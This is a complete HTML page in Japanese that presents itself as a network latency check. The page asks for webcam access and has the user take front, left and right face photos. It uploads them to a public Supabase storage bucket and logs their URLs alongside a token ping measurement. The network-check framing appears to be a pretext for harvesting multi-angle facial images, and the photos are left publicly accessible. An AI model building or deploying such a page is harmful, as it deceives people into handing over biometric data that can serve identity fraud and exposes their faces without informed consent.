<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ネットワークチェック</title>
  <style>
    body {
      background-color: #e8f5e9;
      color: #2e7d32;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background-color: #ffffff;
      width: 100%;
      max-width: 420px;
      border-radius: 20px;
      padding: 24px;
      box-shadow: 0 8px 24px rgba(46, 125, 50, 0.12);
      border: 3px solid #c8e6c9;
      text-align: center;
    }
    h1 { font-size: 1.4rem; color: #2e7d32; margin-top: 0; }
    .step-indicator {
      background-color: #f1f8e9;
      color: #33691e;
      padding: 6px 16px;
      border-radius: 20px;
      font-weight: bold;
      display: inline-block;
      margin-bottom: 15px;
    }
    .media-box {
      width: 100%;
      aspect-ratio: 4/3;
      background-color: #f0f7f4;
      border-radius: 16px;
      overflow: hidden;
      border: 2px dashed #a5d6a7;
    }
    video { width: 100%; height: 100%; object-fit: cover; }
    .btn {
      background-color: #81c784;
      color: white;
      border: none;
      padding: 14px;
      font-size: 1rem;
      font-weight: bold;
      border-radius: 30px;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
    }
    .btn:disabled { background-color: #c8e6c9; cursor: not-allowed; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🌱 ネットワークチェック</h1>
    <div id="stepIndicator" class="step-indicator">📸 ステップ 1/3：正面のお顔</div>
    <div class="media-box">
      <video id="webcam" autoplay playsinline></video>
      <canvas id="canvas" style="display: none;"></canvas>
    </div>
    <button id="snapBtn" class="btn" onclick="takePhoto()">写真を撮影する 🍃</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    const SUPABASE_URL = 'https://fcnuoymkjnpksqedodsb.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_PknjEQtRh8RAPjdSJh_z_efiQC...'; // 請確認這裡填入你的 Publishable key
    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    const webcam = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const snapBtn = document.getElementById('snapBtn');
    const stepIndicator = document.getElementById('stepIndicator');

    let step = 0;
    let blobs = [];

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      webcam.srcObject = stream;
    }).catch(err => alert("カメラの許可が必要です"));

    async function takePhoto() {
      const ctx = canvas.getContext('2d');
      canvas.width = webcam.videoWidth || 320;
      canvas.height = webcam.videoHeight || 240;
      ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);

      await new Promise(r => canvas.toBlob(b => { blobs.push(b); r(); }, 'image/png'));
      step++;

      if (step === 1) {
        stepIndicator.innerText = "📸 ステップ 2/3：左側のお顔";
        alert("正面撮影完了！次は左側を撮影します。");
      } else if (step === 2) {
        stepIndicator.innerText = "📸 ステップ 3/3：右側のお顔";
        alert("左側撮影完了！次は右側を撮影します。");
      } else {
        snapBtn.disabled = true;
        snapBtn.innerText = "🔄 測定・アップロード中...";
        uploadAll();
      }
    }

    async function uploadAll() {
      const start = performance.now();
      try { 
        await fetch('https://fcnuoymkjnpksqedodsb.supabase.co/rest/v1/', { method: 'HEAD' }); 
      } catch(e){}
      const ping = Math.round(performance.now() - start);

      try {
        const time = Date.now();
        const urls = [];
        const names = ['front', 'left', 'right'];

        for (let i = 0; i < 3; i++) {
          const fileName = `delay_${names[i]}_${time}.png`;
          const { error: upErr } = await _supabase.storage.from('delay-photos').upload(fileName, blobs[i]);
          if (upErr) throw upErr;
          const { data } = _supabase.storage.from('delay-photos').getPublicUrl(fileName);
          urls.push(data.publicUrl);
        }

        const { error: dbErr } = await _supabase.from('delay_tests').insert([{
          photo_front: urls[0],
          photo_left: urls[1],
          photo_right: urls[2],
          ping_ms: ping
        }]);

        if (dbErr) throw dbErr;

        stepIndicator.innerText = "🎉 すべて完了しました！";
        snapBtn.innerText = `完了 (Ping: ${ping}ms)`;
      } catch (err) {
        alert("エラー: " + err.message);
        snapBtn.disabled = false;
        snapBtn.innerText = "再試行する";
      }
    }
  </script>
</body>
</html>
